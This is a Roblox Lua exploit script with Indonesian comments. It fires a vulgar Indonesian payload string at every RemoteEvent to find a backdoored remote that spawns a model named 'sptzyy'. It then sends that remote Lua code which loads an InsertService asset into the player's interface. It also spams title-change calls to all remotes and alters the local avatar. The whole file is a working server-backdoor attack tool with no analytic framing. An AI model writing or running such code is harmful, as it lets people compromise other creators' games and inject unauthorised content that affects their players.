local modelName = "sptzyy"
local zyy = nil
local lastFired = nil

-- Hapus objek dengan nama modelName dari workspace
for _, obj in ipairs(workspace:GetChildren()) do
    if obj.Name == modelName then
        obj:Destroy()
    end
end

-- Deteksi saat objek dengan nama modelName ditambahkan ke workspace
workspace.ChildAdded:Connect(function(child)
    if child.Name == modelName and zyy == nil then
        zyy = lastFired
        print("Found zyy!")
    end
end)

local payload = "KONTOL MESUM😂"

-- Kirim payload ke semua RemoteEvent yang ditemukan
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        pcall(function()
            remote:FireServer(payload)
        end)
        lastFired = remote
        game:GetService("RunService").RenderStepped:Wait()
    end
end

task.wait(0.5)

-- Kirim payload ke semua RemoteEvent
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        pcall(function()
            remote:FireServer()
        end)
        lastFired = remote
        game:GetService("RunService").RenderStepped:Wait()
    end
end

-- FITUR TITLE DI AVATAR
local function changePlayerTitle(titleText)
    local player = game.Players.LocalPlayer
    if player then
        -- Method 1: Melalui HumanoidDescription
        if player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                local desc = humanoid:GetAppliedDescription()
                desc.Name = titleText
                humanoid:ApplyDescription(desc)
            end
        end
        
        -- Method 2: Melalui PlayerGui (jika ada UI title)
        if player:FindFirstChild("PlayerGui") then
            for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
                if gui:IsA("TextLabel") or gui:IsA("TextButton") then
                    if string.find(string.lower(gui.Name), "title") or string.find(string.lower(gui.Text), "title") then
                        gui.Text = titleText
                    end
                end
            end
        end
        
        -- Method 3: Broadcast ke semua RemoteEvent
        for _, remote in ipairs(game:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer("SetTitle", titleText)
                    remote:FireServer("ChangeTitle", titleText)
                    remote:FireServer("UpdateTitle", titleText)
                end)
            end
        end
    end
end

-- FITUR LAINNYA UNTUK AVATAR
local function modifyAvatarFeatures()
    local player = game.Players.LocalPlayer
    
    -- Ubah display name
    pcall(function()
        player.DisplayName = "SPTZYY PRO"
    end)
    
    -- Ubah chat color (jika tersedia)
    pcall(function()
        if player:FindFirstChild("ChatColor") then
            player.ChatColor = BrickColor.new("Bright red")
        end
    end)
    
    -- Tambahkan aura/effect
    if player.Character then
        local highlight = Instance.new("Highlight")
        highlight.Name = "SPTZYYAura"
        highlight.FillColor = Color3.fromRGB(255, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
        highlight.Parent = player.Character
    end
    
    -- Ubah ukuran karakter
    pcall(function()
        if player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
            end
        end
    end)
end

-- Eksekusi fitur avatar
changePlayerTitle("⚡ SPTZYY PRO ⚡")
modifyAvatarFeatures()

-- Jika zyy ditemukan dan valid, kirim payload ke zyy
if zyy and typeof(zyy) == "Instance" then
    local playerName = game.Players.LocalPlayer.Name
    local insertPayload = [[
        local player = game.Players:FindFirstChild("]] .. playerName .. [[")
        if player and player:FindFirstChild("PlayerGui") then
            local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
            asset.Parent = player.PlayerGui
            for _, child in ipairs(asset:GetChildren()) do
                child.Parent = player.PlayerGui
            end
            asset:Destroy()
        end
    ]]
    zyy:FireServer(insertPayload)
else
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "sptzyy",
        Text = ":(",
        Icon = "",
        Duration = 5,
    })
end

-- Notifikasi sukses
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "SPTZYY PRO",
    Text = "All features activated! Title changed to ⚡ SPTZYY PRO ⚡",
    Icon = "",
    Duration = 5,
})